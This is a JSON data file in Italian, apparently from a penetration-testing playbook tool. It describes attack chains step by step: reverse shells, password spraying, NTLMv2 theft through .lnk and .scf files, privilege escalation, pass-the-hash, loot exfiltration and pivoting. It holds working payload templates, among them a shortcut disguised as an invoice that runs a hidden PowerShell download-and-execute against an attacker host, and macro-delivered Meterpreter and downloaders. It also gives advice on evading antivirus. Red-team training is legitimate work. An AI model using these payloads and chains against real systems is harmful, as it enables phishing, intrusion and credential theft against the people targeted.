        "id": "s4",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener resta in attesa sulla porta scelta."
      },
      {
        "id": "s5",
        "title": "Reverse shell dalla web shell",
        "cmdRef": "revshell",
        "variant": "php",
        "verify": "La connessione arriva sul listener e `id` restituisce l'utente del web server, tipicamente `www-data` o `apache`."
      },
      {
        "id": "s6",
        "title": "Stabilizzazione della shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "La sessione regge Ctrl+C, cronologia ed editor interattivi."
      }
    ]
  },
  {
    "id": "spray-to-foothold",
    "name": "Password Spray, Foothold",
    "short": "spray",
    "category": "exploitation",
    "subcategory": "cred-attacks",
    "tactic": "Credential Access",
    "difficulty": "medium",
    "estTime": "30-60 min",
    "objective": "Ottenere il primo accesso valido a un dominio partendo da una lista di nomi. Lo spray prova una sola password contro molti utenti, comportamento che resta sotto la soglia di lockout, al contrario del brute force che concentra molti tentativi su un solo account e lo blocca.",
    "outcome": "Credenziali di dominio valide e shell sul primo host raggiungibile",
    "prereqs": [
      "Una lista di nomi reali, ricavata da OSINT o dall'enumerazione",
      "Raggiungibilità di SMB, LDAP o Kerberos verso un domain controller",
      "Password policy nota, per non superare la soglia di lockout"
    ],
    "mitre": [
      "T1110.003",
      "T1078.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Costruzione della userlist",
        "cmdRef": "username-anarchy",
        "verify": "La userlist contiene le varianti di ogni nome (`nome.cognome`, `n.cognome`, `ncognome`...). Prima di sprayare conviene validarla, per non sprecare tentativi su utenti inesistenti e alzare meno rumore."
      },
      {
        "id": "s2",
        "title": "Verifica della lockout policy",
        "cmdRef": "nxc-smb-passpol",
        "verify": "La policy mostra la soglia di lockout, la finestra di conteggio e la durata del blocco. Con soglia maggiore di zero un solo tentativo per giro resta sicuro; a zero il lockout è disattivato e lo spray è libero."
      },
      {
        "id": "s3",
        "title": "Validazione degli utenti via Kerberos",
        "cmdRef": "kerbrute-spray",
        "verify": "Kerbrute distingue gli utenti esistenti da quelli inventati senza generare eventi di logon falliti su SMB."
      },
      {
        "id": "s4",
        "title": "Password spray su SMB",
        "cmdRef": "nxc-smb-spray",
        "variant": "default",
        "verify": "Una riga con `[+]` indica credenziali valide, e l'eventuale `(Pwn3d!)` che l'utente è amministratore locale su quell'host."
      },
      {
        "id": "s5",
        "title": "Shell sul target raggiungibile",
        "cmdRef": "psexec",
        "variant": "default",
        "verify": "Si apre il prompt `C:\\Windows\\system32>` e `whoami` restituisce `nt authority\\system`."
      },
      {
        "id": "s6",
        "title": "Alternativa via WinRM",
        "cmdRef": "evil-winrm",
        "variant": "default",
        "verify": "Il prompt `Evil-WinRM* PS >` conferma la sessione. Richiede l'appartenenza al gruppo Remote Management Users."
      }
    ]
  },
  {
    "id": "lnk-ntlm-theft",
    "name": "LNK, Icona UNC, Furto NTLMv2",
    "short": "lnk-ntlm",
    "category": "exploitation",
    "subcategory": "client-side",
    "tactic": "Credential Access",
    "difficulty": "medium",
    "estTime": "20-40 min",
    "objective": "Un file `.lnk` piazzato in una share che la vittima naviga forza l'autenticazione: Explorer, risolvendo l'icona via UNC, invia il NetNTLMv2 dell'utente senza che questi clicchi nulla. Lo catturi con Responder e lo cracchi offline, oppure lo rilanci in relay.",
    "outcome": "Hash NetNTLMv2 di un utente, da craccare o da rilanciare in relay.",
    "prereqs": [
      "Una share interna scrivibile che la vittima (utente o processo) naviga",
      "Responder in ascolto sulla tua interfaccia",
      "Un target Windows moderno (il `.lnk` resta valido su tutte le versioni)"
    ],
    "mitre": [
      "T1187",
      "T1110.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Listener NTLM in ascolto",
        "cmdRef": "responder",
        "variant": "default",
        "verify": "Responder è in ascolto su LLMNR/NBT-NS e sulle share SMB, pronto a raccogliere i challenge."
      },
      {
        "id": "s2",
        "title": "Crea e piazza il .lnk",
        "cmdRef": "client-lnk",
        "cmd": {
          "name": "SMB Attack — .lnk / .Library-ms",
          "description": "Furto dell'hash NTLMv2 senza click: Explorer risolve l'icona via UNC appena apre la cartella. Il prefisso `@` mette il file in cima. Cattura con Responder o Inveigh.",
          "template": "# .lnk che forza l'autenticazione: TargetPath e IconLocation sulla tua share SMB\n$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"$PWD\\@invoice.lnk\")\n$s.TargetPath=\"\\\\<lhost>\\share\\x\"\n$s.IconLocation=\"\\\\<lhost>\\share\\x\"\n$s.Save()",
          "params": [
            {
              "key": "lhost",
              "label": "LHOST",
              "placeholder": "10.10.14.5"
            }
          ]
        },
        "variant": "ntlm",
        "verify": "Il `.lnk` ha `TargetPath` e `IconLocation` sulla tua share SMB; il prefisso `@` lo mette in cima. Copialo nella share che la vittima naviga."
      },
      {
        "id": "s3",
        "title": "Crack del NetNTLMv2 (offline)",
        "cmdRef": "hashcat-ntlm",
        "verify": "Responder stampa il NetNTLMv2 dell'utente che ha aperto la cartella. hashcat con mode 5600 lo cracca con una wordlist."
      },
      {
        "id": "s4",
        "title": "Alternativa: relay invece del crack",
        "cmdRef": "ntlmrelayx-smb",
        "variant": "default",
        "verify": "Se l'SMB signing non è obbligatorio sul bersaglio, rilancia l'autenticazione con ntlmrelayx verso un altro host, senza craccarla."
      }
    ]
  },
  {
    "id": "scf-ntlm-theft",
    "name": "SCF, Furto NTLMv2 (Windows legacy)",
    "short": "scf-ntlm",
    "category": "exploitation",
    "subcategory": "client-side",
    "tactic": "Credential Access",
    "difficulty": "easy",
    "estTime": "15 min",
    "objective": "Stessa idea del `.lnk` per il furto NetNTLMv2, ma tramite un file `.scf`. Vale solo su Windows precedenti a 10 1709 e Server 2016: dopo la tecnica è stata patchata. Resta una via comoda sui target datati.",
    "outcome": "Hash NetNTLMv2 di un utente su un host Windows datato.",
    "prereqs": [
      "Un target Windows precedente a 10 1709 / Server 2016",
      "Una share scrivibile navigata dalla vittima",
      "Responder in ascolto"
    ],
    "mitre": [
      "T1187",
      "T1110.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Listener NTLM in ascolto",
        "cmdRef": "responder",
        "variant": "default",
        "verify": "Responder resta in ascolto, pronto a catturare i challenge NetNTLMv2."
      },
      {
        "id": "s2",
        "title": "Crea e piazza il .scf",
        "cmdRef": "client-lnk",
        "cmd": {
          "name": "SMB Attack — .lnk / .Library-ms",
          "description": "Legacy: stesso furto NTLM del `.lnk`, ma via file `.scf`. Funziona solo prima di **Windows 10 1709** e **Server 2016**; dopo è stato patchato, usa il `.lnk`.",
          "template": "# .scf — solo Windows precedenti a 10 1709 / Server 2016. Salva come @legit.scf nella share che la vittima naviga.\n[Shell]\nCommand=2\nIconFile=\\\\<lhost>\\share\\x.ico\n[Taskbar]\nCommand=ToggleDesktop",
          "params": [
            {
              "key": "lhost",
              "label": "LHOST",
              "placeholder": "10.10.14.5"
            }
          ]
        },
        "variant": "scf",
        "verify": "Il `.scf` punta via `IconFile` alla tua share SMB. Salvalo come `@...scf` nella cartella che la vittima naviga: su Windows datati Explorer risolve l'icona e invia il NetNTLMv2."
      },
      {
        "id": "s3",
        "title": "Crack del NetNTLMv2 (offline)",
        "cmdRef": "hashcat-ntlm",
        "verify": "Il NetNTLMv2 catturato da Responder si cracca con hashcat mode 5600 e una wordlist."
      }
    ]
  },
  {
    "id": "lnk-exec",
    "name": "LNK, Downloader, Shell",
    "short": "lnk-exec",
    "category": "exploitation",
    "subcategory": "client-side",
    "tactic": "Execution",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Un collegamento `.lnk` camuffato da documento: quando la vittima lo apre, lancia un downloader PowerShell che scarica ed esegue il secondo stadio verso il tuo host, restituendo una shell.",
    "outcome": "Shell sull'host della vittima, nel contesto dell'utente.",
    "prereqs": [
      "Consegna del `.lnk` alla vittima (email, share) con un nome credibile",
      "Un web server e un listener sul tuo host",
      "Connettività in uscita dalla vittima verso di te"
    ],
    "mitre": [
      "T1204.002",
      "T1059.001"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener attende la reverse shell sulla porta scelta."
      },
      {
        "id": "s2",
        "title": "Ospita il payload del secondo stadio",
        "cmdRef": "transfer-http",
        "variant": "default",
        "verify": "Il tuo web server serve `a.ps1`: è l'indirizzo a cui punta il downloader del `.lnk`."
      },
      {
        "id": "s3",
        "title": "Crea e consegna il .lnk",
        "cmdRef": "client-lnk",
        "cmd": {
          "name": "SMB Attack — .lnk / .Library-ms",
          "description": "Esecuzione di comandi quando la vittima apre il collegamento: lancia un downloader PowerShell verso il tuo host. L'icona `shell32.dll,70` lo fa sembrare un documento.",
          "template": "$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"$PWD\\invoice.lnk\")\n$s.TargetPath=\"powershell.exe\"\n$s.Arguments=\"-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/a.ps1')\"\n$s.IconLocation=\"shell32.dll,70\"\n$s.Save()",
          "params": [
            {
              "key": "lhost",
              "label": "LHOST",
              "placeholder": "10.10.14.5"
            }
          ]
        },
        "variant": "lnk",
        "verify": "Il `.lnk` ha `TargetPath=powershell.exe` e un downloader negli `Arguments`; l'icona lo fa sembrare un documento. All'apertura parte la reverse shell."
      },
      {
        "id": "s4",
        "title": "Stabilizza la shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "La sessione regge Ctrl+C e gli editor; `whoami` conferma l'utente."
      }
    ]
  },
  {
    "id": "libraryms-webdav",
    "name": "Library-ms, WebDAV, Shell",
    "short": "library-ms",
    "category": "exploitation",
    "subcategory": "client-side",
    "tactic": "Execution",
    "difficulty": "medium",
    "estTime": "25 min",
    "objective": "Un file `.Library-ms` monta in Explorer una share WebDAV controllata dall'attaccante: la vittima, aprendolo, vede la cartella remota e lancia il `.lnk` al suo interno, che esegue il payload. Richiede il servizio WebClient attivo sulla vittima.",
    "outcome": "Esecuzione sul client della vittima (shell).",
    "prereqs": [
      "Il servizio WebClient attivo sulla vittima (default sulle workstation Windows 10/11, non su Server)",
      "Un server WebDAV raggiungibile sul tuo host",
      "Consegna del `.Library-ms` alla vittima"
    ],
    "mitre": [
      "T1204.002",
      "T1187"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener attende la connessione sulla porta scelta."
      },
      {
        "id": "s2",
        "title": "Avvia WebDAV e prepara i file",
        "cmdRef": "client-lnk",
        "cmd": {
          "name": "SMB Attack — .lnk / .Library-ms",
          "description": "Monta una share WebDAV dell'attaccante in Explorer; il `.lnk` interno esegue o coercizza l'auth. Richiede il servizio WebClient attivo sulla vittima (workstation per default, Server no).",
          "template": "# 1. share WebDAV anonima sul tuo host\nwsgidav --host=0.0.0.0 --port=80 --root=./share --auth=anonymous\n\n# 2. crea un file .Library-ms che punta a \\\\<lhost>\\share (URL nell'elemento simpleLocation; XML completo su PayloadsAllTheThings)\n\n# 3. dentro ./share metti un .lnk: la vittima apre il .Library-ms, vede la share e lancia il .lnk",
          "params": [
            {
              "key": "lhost",
              "label": "LHOST",
              "placeholder": "10.10.14.5"
            }
          ]
        },
        "variant": "libraryms",
        "verify": "wsgidav serve la tua cartella; il `.Library-ms` punta alla share (elemento simpleLocation) e contiene un `.lnk` che esegue il payload."
      },
      {
        "id": "s3",
        "title": "Stabilizza la shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "Ricevuta la shell, stabilizzala: regge Ctrl+C ed editor."
      }
    ]
  },
  {
    "id": "macro-meterpreter",
    "name": "Macro VBA, Shellcode, Meterpreter",
    "short": "macro-msf",
    "category": "exploitation",
    "subcategory": "client-side",
    "tactic": "Execution",
    "difficulty": "easy",
    "estTime": "15 min",
    "objective": "Un documento Office con macro VBA: la macro porta lo shellcode generato da msfvenom e all'apertura (AutoOpen) apre una sessione Meterpreter verso il tuo handler. Richiede che la vittima abiliti le macro.",
    "outcome": "Sessione Meterpreter sull'host della vittima.",
    "prereqs": [
      "Un handler Metasploit in ascolto con lo stesso payload del VBA",
      "Una vittima che abilita le macro (consegna credibile)",
      "Formato Office binario legacy (`.doc`/`.xls`) per l'auto-esecuzione"
    ],
    "mitre": [
      "T1204.002",
      "T1059.005"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Handler Meterpreter in ascolto",
        "cmdRef": "msf-handler",
        "verify": "L'handler è configurato con lo stesso payload del VBA (`windows/x64/meterpreter/reverse_tcp`) e resta in attesa della sessione."
      },
      {
        "id": "s2",
        "title": "Genera la macro e consegna il documento",
        "cmdRef": "client-macro",
        "variant": "msf",
        "verify": "msfvenom produce il VBA; incollalo nell'editor macro di un `.doc`/`.xls` con `AutoOpen`. Quando la vittima abilita le macro, sull'handler compare `Meterpreter session opened`."
      }
    ]
  },
  {
    "id": "macro-downloader",
    "name": "Macro VBA, Downloader, Shell",
    "short": "macro-dl",
    "category": "exploitation",
    "subcategory": "client-side",
    "tactic": "Execution",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Un documento Office con macro VBA che, all'apertura, scarica ed esegue un secondo stadio PowerShell dal tuo server. Il payload è più piccolo del VBA con shellcode embeddato e più facile da offuscare contro l'AV.",
    "outcome": "Shell sull'host della vittima, nel contesto dell'utente.",
    "prereqs": [
      "Un web server e un listener sul tuo host",
      "Una vittima che abilita le macro",
      "Connettività in uscita dalla vittima verso di te"
    ],
    "mitre": [
      "T1204.002",
      "T1059.001"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener attende la reverse shell del secondo stadio sulla porta scelta."
      },
      {
        "id": "s2",
        "title": "Ospita il secondo stadio",
        "cmdRef": "transfer-http",
        "variant": "default",
        "verify": "Il tuo web server serve `a.ps1`, lo script che la macro scaricherà ed eseguirà."
      },
      {
        "id": "s3",
        "title": "Crea e consegna la macro",
        "cmdRef": "client-macro",
        "variant": "downloader",
        "verify": "La macro con `AutoOpen` lancia `powershell ... IEX(DownloadString('http://<lhost>/a.ps1'))`. All'apertura con macro abilitate, parte il download e il secondo stadio."
      },
      {
        "id": "s4",
        "title": "Stabilizza la shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "La sessione regge Ctrl+C e gli editor; `whoami` conferma l'utente."
      }
    ]
  },
  {
    "id": "foothold-triage",
    "name": "Foothold, Triage dell'host",
    "short": "triage",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "tactic": "Discovery",
    "difficulty": "easy",
    "estTime": "20 min",
    "objective": "Capire dove si è finiti prima di muovere qualsiasi altro passo: quale utente, con quali privilegi, su quale sistema, dentro quale rete e con quali difese attive. La catena copre sia Linux sia Windows, quindi vanno eseguiti solo i passi del sistema operativo effettivamente incontrato.",
    "outcome": "Quadro completo di utente, host, rete e credenziali disponibili in locale",
    "prereqs": [
      "Una shell qualsiasi sul target, anche non privilegiata",
      "Nessun requisito di privilegi elevati per la maggior parte dei comandi"
    ],
    "mitre": [
      "T1082",
      "T1087",
      "T1552"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Identità e sistema, Linux",
        "cmdRef": "sa-linux-who",
        "verify": "Restituisce utente, gruppi, hostname e distribuzione, ciòè il punto di partenza per scegliere il vettore di escalation."
      },
      {
        "id": "s2",
        "title": "Rete e vicini, Linux",
        "cmdRef": "sa-linux-net",
        "verify": "Le connessioni verso subnet non raggiungibili dall'attaccante indicano le reti candidate al pivoting."
      },
      {
        "id": "s3",
        "title": "Identità e privilegi, Windows",
        "cmdRef": "sa-win-who",
        "verify": "I privilegi del token e i gruppi locali dicono subito se esiste una scorciatoia verso SYSTEM."
      },
      {
        "id": "s4",
        "title": "Sistema e patch, Windows",
        "cmdRef": "sa-win-sys",
        "verify": "Versione, build e hotfix installati permettono di valutare gli exploit kernel applicabili."
      },
      {
        "id": "s5",
        "title": "Utenti e gruppi di dominio",
        "cmdRef": "sa-win-domain"
      },
      {
        "id": "s6",
        "title": "Credenziali in chiaro sull'host",
        "cmdRef": "creds-linux",
        "variant": "configs",
        "verify": "File di configurazione, cronologia della shell e variabili d'ambiente sono i tre posti in cui le credenziali compaiono più spesso."
      },
      {
        "id": "s7",
        "title": "File di valore sul filesystem",
        "cmdRef": "pillage-files",
        "variant": "default",
        "verify": "Database KeePass, backup, repository git e file di risposta automatica sono i candidati più frequenti."
      }
    ]
  },
  {
    "id": "loot-exfil",
    "name": "Trasferimento file e raccolta del loot",
    "short": "loot",
    "category": "post-exp",
    "subcategory": "file-transfer",
    "tactic": "Collection",
    "difficulty": "easy",
    "estTime": "20 min",
    "objective": "Portare strumenti sul target e riportare indietro il materiale raccolto, scegliendo il canale in base a cosa il target consente. Il metodo giusto dipende da quali binari sono presenti e da quali protocolli il firewall lascia passare in uscita.",
    "outcome": "Strumenti sul target e loot recuperato sulla macchina attaccante",
    "prereqs": [
      "Esecuzione di comandi sul target",
      "Almeno un canale in uscita fra HTTP, SMB e SSH",
      "Spazio scrivibile sul target, tipicamente /tmp oppure C:\\Windows\\Temp"
    ],
    "mitre": [
      "T1105",
      "T1083"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Server HTTP lato attaccante",
        "cmdRef": "transfer-http",
        "variant": "default",
        "verify": "Il server registra ogni richiesta con IP di origine e codice di risposta, il che conferma anche la raggiungibilità del target."
      },
      {
        "id": "s2",
        "title": "Download su target Linux",
        "cmdRef": "transfer-http",
        "variant": "linux",
        "verify": "Il file arriva integro, verificabile confrontando l'hash con `md5sum` sui due lati."
      },
      {
        "id": "s3",
        "title": "Download su target Windows",
        "cmdRef": "transfer-http",
        "variant": "windows",
        "verify": "`Invoke-WebRequest` funziona ovunque, mentre `certutil` è un LOLBin già presente e spesso meno sospetto."
      },
      {
        "id": "s4",
        "title": "Esecuzione in memoria senza toccare il disco",
        "cmdRef": "transfer-http",
        "variant": "memory",
        "verify": "Lo script viene eseguito senza che nessun file compaia sul filesystem, il che aggira i controlli antivirus su scrittura."
      },
      {
        "id": "s5",
        "title": "Share SMB come canale alternativo",
        "cmdRef": "transfer-smb",
        "variant": "default",
        "verify": "La share risulta montabile dal target. È la via da preferire quando HTTP in uscita è bloccato ma SMB interno è consentito."
      },
      {
        "id": "s6",
        "title": "Ricerca del loot sull'host",
        "cmdRef": "pillage-files",
        "variant": "default",
        "verify": "L'elenco dei file trovati va filtrato prima di scaricare, per non esfiltrare dati fuori scope."
      },
      {
        "id": "s7",
        "title": "Ricerca nelle share di dominio",
        "cmdRef": "manspider",
        "variant": "default",
        "verify": "Ogni risultato riporta share, percorso e contesto del match, così da valutare la rilevanza prima del download."
      }
    ]
  },
  {
    "id": "linux-privesc",
    "name": "Linux: Enumerazione, root",
    "short": "linpe",
    "category": "privesc-linux",
    "subcategory": "auto-enum",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "30-60 min",
    "objective": "Passare da utente non privilegiato a root su Linux seguendo l'ordine che paga di più: prima l'enumerazione automatica per avere il quadro, poi i quattro vettori classici nell'ordine sudo, SUID, capabilities e cron, e solo alla fine il kernel, che è l'ultima risorsa perché rischia di far cadere la macchina.",
    "outcome": "Shell di root sul target Linux",
    "prereqs": [
      "Shell come utente non privilegiato, preferibilmente già stabilizzata",
      "Possibilità di scrivere in una directory come /tmp o /dev/shm",
      "Autorizzazione a tentare exploit kernel, che possono causare crash"
    ],
    "mitre": [
      "T1082",
      "T1068"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Enumerazione automatica",
        "cmdRef": "linpeas",
        "variant": "local",
        "verify": "Le voci evidenziate in rosso e giallo sono quelle da esaminare per prime. L'output va salvato, perché è lungo e serve rileggerlo."
      },
      {
        "id": "s2",
        "title": "Regole sudo",
        "cmdRef": "sudo-l"
      },
      {
        "id": "s3",
        "title": "Escape da un binario sudo",
        "cmdRef": "gtfobins",
        "verify": "L'escape restituisce una shell con `id` che riporta `uid=0(root)`."
      },
      {
        "id": "s4",
        "title": "Binari SUID e SGID",
        "cmdRef": "find-suid",
        "variant": "default",
        "verify": "I binari non standard sono quelli interessanti: `pkexec`, `screen` e i binari custom del cliente meritano attenzione, mentre `ping` e `su` sono normali."
      },
      {
        "id": "s5",
        "title": "Hijack di libreria su binario SUID",
        "cmdRef": "find-suid",
        "variant": "soinject",
        "verify": "`strace` o `ltrace` mostrano la `.so` cercata e non trovata, che è il punto in cui inserire il payload."
      },
      {
        "id": "s6",
        "title": "Capabilities sui binari",
        "cmdRef": "getcap-all",
        "verify": "`cap_setuid` su un interprete come python3 è escalation diretta, `cap_dac_read_search` consente la lettura di `/etc/shadow`."
      },
      {
        "id": "s7",
        "title": "Cron job e timer",
        "cmdRef": "cron-discover",
        "variant": "writable",
        "verify": "Uno script eseguito da root e scrivibile dall'utente corrente è escalation garantita al successivo avvio del job."
      },
      {
        "id": "s8",
        "title": "Exploit kernel come ultima risorsa",
        "cmdRef": "linux-exploit-suggester"
      }
    ]
  },
  {
    "id": "windows-privesc",
    "name": "Windows: Enumerazione, SYSTEM",
    "short": "winpe",
    "category": "privesc-windows",
    "subcategory": "auto-enum",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "30-60 min",
    "objective": "Passare da utente non privilegiato a SYSTEM su Windows. L'ordine che rende di più parte dai privilegi del token, che spesso risolvono in un colpo solo sui service account, per poi passare alle misconfiguration dei servizi e infine alle patch mancanti.",
    "outcome": "Contesto NT AUTHORITY\\SYSTEM sul target Windows",
    "prereqs": [
      "Shell come utente non privilegiato su Windows",
      "Possibilità di scrivere in una directory come C:\\Windows\\Temp",
      "Consapevolezza che gli strumenti di enumerazione automatica sono firmati dagli EDR"
    ],
    "mitre": [
      "T1082",
      "T1068"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Enumerazione automatica",
        "cmdRef": "winpeas"
      },
      {
        "id": "s2",
        "title": "Vista mirata per categoria",
        "cmdRef": "seatbelt"
      },
      {
        "id": "s3",
        "title": "Privilegi del token",
        "cmdRef": "whoami-priv",
        "verify": "`SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` abilitati portano direttamente alla catena Potato. Anche `SeBackupPrivilege`, `SeDebugPrivilege` e `SeTakeOwnershipPrivilege` sono escalation dirette."
      },
      {
        "id": "s4",
        "title": "Misconfiguration dei servizi",
        "cmdRef": "powerup",
        "variant": "default",
        "verify": "Le voci `AbuseFunction` indicano già il comando da usare per sfruttare ogni misconfiguration trovata."
      },
      {
        "id": "s5",
        "title": "AlwaysInstallElevated",
        "cmdRef": "aie",
        "variant": "default",
        "verify": "Entrambe le chiavi, quella in HKLM e quella in HKCU, devono valere `0x1`. Con una sola delle due il vettore non funziona."
      },
      {
        "id": "s6",
        "title": "Unquoted service path",
        "cmdRef": "unquoted-path",
        "variant": "default",
        "verify": "Serve un path con spazi, non racchiuso fra virgolette, e permessi di scrittura su una delle directory intermedie."
      },
      {
        "id": "s7",
        "title": "Patch mancanti",
        "cmdRef": "wes"
      }
    ]
  },
  {
    "id": "seimpersonate-system",
    "name": "SeImpersonate, SYSTEM",
    "short": "potato",
    "category": "privesc-windows",
    "subcategory": "token-priv",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "15 min",
    "objective": "Sfruttare il privilegio SeImpersonatePrivilege, che è assegnato di default ai service account di IIS, MSSQL ed Exchange, per passare a SYSTEM. Il meccanismo consiste nel costringere un processo privilegiato ad autenticarsi verso un named pipe controllato dall'attaccante, che ne impersona poi il token.",
    "outcome": "Contesto SYSTEM e hash degli account locali",
    "prereqs": [
      "Shell come service account con SeImpersonatePrivilege abilitato",
      "Il tool va scelto in base alla versione di Windows del target",
      "Possibilità di scrivere ed eseguire un binario sul target"
    ],
    "mitre": [
      "T1134.001",
      "T1068"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Conferma del privilegio",
        "cmdRef": "whoami-priv",
        "verify": "`SeImpersonatePrivilege` compare nella lista con stato `Enabled`. Se risulta `Disabled` il vettore non è percorribile."
      },
      {
        "id": "s2",
        "title": "Ottieni SYSTEM (scegli il tool dai tab)",
        "cmdRef": "printspoofer",
        "verify": "`whoami` restituisce `nt authority\\system` nella nuova shell. Il tool si sceglie in base alla versione di Windows: PrintSpoofer su Win10 e Server 2016-2019, GodPotato da Server 2012 a 2022 (scelta sicura quando la versione è incerta), JuicyPotatoNG come ripiego per configurazioni COM particolari."
      },
      {
        "id": "s3",
        "title": "Dump delle credenziali locali",
        "cmdRef": "secretsdump",
        "variant": "local",
        "verify": "Compaiono gli hash di SAM a partire da `Administrator:500:`, più eventuali segreti LSA e password di servizio in chiaro."
      },
      {
        "id": "s4",
        "title": "Riuso dell'hash sugli altri host",
        "cmdRef": "nxc-pth",
        "variant": "default",
        "verify": "Un `(Pwn3d!)` su altri host indica che l'account amministratore locale è condiviso, situazione comune e ottima per il movimento laterale."
      }
    ]
  },
  {
    "id": "pth-lateral",
    "name": "Pass-the-Hash, Movimento laterale",
    "short": "pth",
    "category": "lateral",
    "subcategory": "pass-the-hash",
    "tactic": "Lateral Movement",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Muoversi fra host usando l'hash NT senza mai conoscere la password. NTLM accetta l'hash come prova di identità, quindi l'hash estratto da un host vale su tutti quelli che condividono lo stesso account amministratore locale, situazione ancora molto diffusa.",
    "outcome": "Shell su host aggiuntivi senza conoscere alcuna password",
    "prereqs": [
      "Un hash NT valido, tipicamente estratto da SAM o LSASS",
      "SMB o WinRM raggiungibili verso i target",
      "NTLM non disabilitato sul dominio, altrimenti serve Pass-the-Ticket"
    ],
    "mitre": [
      "T1550.002",
      "T1021.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Estrazione degli hash locali",
        "cmdRef": "secretsdump",
        "variant": "local",
        "verify": "Compare la riga `Administrator:500:` con l'hash NT. La parte LM è di norma vuota sui sistemi moderni e non serve."
      },
      {
        "id": "s2",
        "title": "Verifica dell'hash su tutta la subnet",
        "cmdRef": "nxc-pth",
        "variant": "default",
        "verify": "Un `(Pwn3d!)` indica che l'hash concede privilegi amministrativi su quell'host."
      },
      {
        "id": "s3",
        "title": "Account locale invece che di dominio",
        "cmdRef": "nxc-pth",
        "variant": "local",
        "verify": "`--local-auth` è necessario per gli account locali: senza, l'autenticazione viene tentata contro il dominio e fallisce."
      },
      {
        "id": "s4",
        "title": "Shell con PsExec",
        "cmdRef": "psexec",
        "variant": "hash",
        "verify": "Si ottiene SYSTEM ma il metodo crea un servizio sul target, quindi è il più rumoroso e il più registrato dagli EDR."
      },
      {
        "id": "s5",
        "title": "Alternativa più discreta con WMI",
        "cmdRef": "wmiexec",
        "variant": "hash",
        "verify": "Non crea servizi né scrive file, al prezzo di una shell semi-interattiva che esegue un comando per volta."
      },
      {
        "id": "s6",
        "title": "WinRM quando disponibile",
        "cmdRef": "nxc-pth",
        "variant": "winrm",
        "verify": "Richiede l'appartenenza a Remote Management Users ed è generalmente meno sorvegliato di SMB."
      }
    ]
  },
  {
    "id": "ligolo-pivot",
    "name": "Pivoting con Ligolo-ng",
    "short": "ligolo",
    "category": "lateral",
    "subcategory": "pivoting",
    "tactic": "Lateral Movement",
    "difficulty": "medium",
    "estTime": "10 min",
    "objective": "Pivotare in una rete interna con Ligolo-ng: interfaccia tun sull'attacker, agent sul ponte, aggiungi una route e raggiungi la subnet interna con i tool Kali normali, senza proxychains.",
    "outcome": "Subnet interna raggiungibile direttamente dalla Kali",
    "prereqs": [
      "Shell sulla macchina ponte (dual-homed)",
      "Binari ligolo: proxy (attacker) e agent (target), da github.com/nicocha30/ligolo-ng"
    ],
    "mitre": [
      "T1090",
      "T1572"
    ],
    "refs": [
      {
        "label": "Guide to Pivoting using Ligolo-ng — Medium",
        "url": "https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16"
      },
      {
        "label": "Ligolo-ng — repo ufficiale",
        "url": "https://github.com/nicocha30/ligolo-ng"
      }
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "`ip addr` elenca l'interfaccia `ligolo`, che resta in stato DOWN finché il tunnel non viene avviato.",
        "title": "Crea l'interfaccia TUN (Kali)",
        "cmd": {
          "name": "Ligolo — interfaccia TUN",
          "description": "Il primo passo è creare l'interfaccia TUN con questi comandi. Per visualizzare la nuova interfaccia `ligolo` basta un `ifconfig`.",
          "template": "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up",
          "params": []
        }
      },
      {
        "id": "s2",
        "verify": "L'agent è presente sul ponte ed è eseguibile.",
        "title": "Scarica e invia l'agent al ponte",
        "cmd": {
          "name": "scp — invia l'agent",
          "description": "Scarica l'agent adatto al sistema che farà da ponte (dalle release GitHub). Dopodiché lo invii al target ponte tramite `scp`, se hai una connessione SSH.",
          "template": "scp <agent> <user>@<pivot>:/tmp",
          "params": [
            {
              "key": "agent",
              "label": "Path agent",
              "placeholder": "./agent"
            },
            {
              "key": "user",
              "label": "User ponte",
              "ctx": "user",
              "placeholder": "jbetty"
            },
            {
              "key": "pivot",
              "label": "IP ponte",
              "ctx": "ip",
              "placeholder": "10.129.170.173"
            }
          ]
        }
      },
      {
        "id": "s3",
        "verify": "Nella console del proxy compare `Agent joined` con nome host e utente dell'agent.",
        "title": "Avvia proxy (Kali) e agent (ponte)",
        "cmd": {
          "name": "Ligolo — proxy + agent",
          "description": "Su Kali avvii `ligolo-proxy` con certificati autofirmati; sulla macchina ponte avvii l'agent, che si connette al proxy. Una volta connessi all'agente, il comando `help` mostra cosa puoi fare.",
